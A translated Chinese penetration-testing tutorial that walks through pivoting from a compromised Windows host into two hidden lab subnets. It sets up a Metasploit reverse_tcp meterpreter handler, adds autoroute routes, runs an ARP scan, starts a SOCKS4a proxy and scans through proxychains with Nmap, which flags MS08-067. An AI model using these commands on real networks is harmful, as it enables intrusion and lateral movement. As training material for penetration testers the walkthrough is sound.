# 【技术分享】多重转发渗透隐藏内网

### 译文声明
本文为翻译文章，原文来源：pentest.blog。具体内容及含义请以原文为准。

### 作者信息
- 作者：[quanyechavshuo](http://bobao.360.cn/member/contribute?uid=1255579132)
- 预估稿费：150RMB
- 投稿方式：发送邮件至 [linwei#360.cn](mailto:PI:EMAIL) 或登录 [网页版](http://bobao.360.cn/contribute/index) 在线投稿

## 0x00 关于
本案例中的内网结构如下：
- **Attacker**（攻击者）：使用Kali系统，拥有一个网卡，位于172.16.0.0/24网段。
- **RD**（已渗透的目标）：拥有两个网卡，分别连接到172.16.0.0/24和7.7.7.0/24网段。
- **JC**：拥有两个网卡，分别连接到7.7.7.0/24和8.8.8.0/24网段。存在ms08-067和efs bof漏洞，可获取shell。
- **SK**：拥有一块网卡，位于8.8.8.0/24网段，存在vsftpd漏洞，可获取shell。
- 初始状态下，Attacker仅通过Metasploit框架在RD上获得了反向Shell，对内网其他部分一无所知，特别是7.7.7.0/24和8.8.8.0/24这两个隐藏网段。
- 目标是利用RD渗透进入7.7.7.0/24和8.8.8.0/24这两个隐藏的网段。

## 0x01 步骤1
在RD上运行了一个反向类型的后门，并执行以下操作：

```bash
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 172.16.0.20 
LHOST => 172.16.0.20
msf exploit(handler) > set LPORT 1234
LPORT => 1234
msf exploit(handler) > run
[*] Started reverse TCP handler on 172.16.0.20:1234 
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 172.16.0.11
[*] Meterpreter session 2 opened (172.16.0.20:1234 -> 172.16.0.11:49162)
```

接着，查看RD上的网络接口配置：

```bash
meterpreter > ifconfig
Interface  1============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

Interface 11============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:e1:3f:af
MTU          : 1500
IPv4 Address : 172.16.0.11
IPv4 Netmask : 255.255.255.0

Interface 19============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:7f:3c:fe
MTU          : 1500
IPv4 Address : 7.7.7.11
IPv4 Netmask : 255.255.255.0
```

## 0x02 步骤2
发现RD有两块网卡后，尝试渗透另一个网段7.7.7.0/24。首先需要添加路由，以便使MSF模块能够访问该网段。Meterpreter shell可以直接访问7.7.7.x网段，但MSF模块不能。因此，需要在Meterpreter中添加路由。

```bash
meterpreter > run autoroute -s 7.7.7.0/24
[*] Adding a route to 7.7.7.0/255.255.255.0...
[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p
Active Routing Table
====================
 Subnet   Netmask   Gateway
 ------   -------   -------
 7.7.7.0  255.255.255.0  Session 2
```

然后，开始扫描7.7.7.0/24网段：

```bash
meterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
[*] Running module against DISCORDIA
[*] ARP Scanning 7.7.7.0/24
[*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)
[*]     IP  7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)
[*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)
[*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)
```

由于`arp_scanner`无法扫描端口信息，可以使用Nmap进行更全面的扫描。首先，在RD上启动SOCKS4代理，然后使用Proxychains设置Nmap的代理为MSF模块提供的代理入口。

```bash
meterpreter > background 
[*] Backgrounding session 2...
msf > use auxiliary/server/socks4a 
msf auxiliary(socks4a) > show options 
Module options (auxiliary/server/socks4a):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.

msf auxiliary(socks4a) > set srvhost 172.16.0.20
srvhost => 172.16.0.20
msf auxiliary(socks4a) > run
[*] Auxiliary module execution completed
[*] Starting the socks4a proxy server
msf auxiliary(socks4a) > netstat -antp | grep 1080
[*] exec: netstat -antp | grep 1080
tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby       
```

编辑`/etc/proxychains.conf`文件，添加代理配置：

```conf
[ProxyList]
socks4  172.16.0.20 1080
```

使用Nmap扫描7.7.7.20：

```bash
root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.25BETA1 ( https://nmap.org )
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:445-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:80-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:135-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:139-<><>-OK
Nmap scan report for 7.7.7.20
Host is up (0.17s latency).

PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)
80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs: CVE:CVE-2008-4250
|     Disclosure date: 2008-10-23
|     References: 
```

通过这些步骤，我们可以成功渗透并探索隐藏的内网网段。